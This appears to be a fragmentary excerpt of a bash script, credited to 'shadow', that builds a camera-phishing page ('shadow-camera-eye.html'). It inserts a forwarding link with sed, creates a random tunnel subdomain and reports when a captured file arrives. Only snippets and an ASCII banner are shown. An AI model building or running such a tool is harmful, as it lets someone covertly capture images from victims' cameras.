...
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣷⣶⣿⣿
"
printf " \e[1;77m tool created by    shadow\e[0m \n"
...
if [[ -e "Log.log" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] shadow file received!\e[0m\n"
...
sed 's+forwarding_link+'$link'+g' shadow-camera-eye.html > index2.html
...
sed 's+forwarding_link+'$send_link'+g' shadow-camera-eye.html > index2.html
...
default_subdomain="shadow$RANDOM"
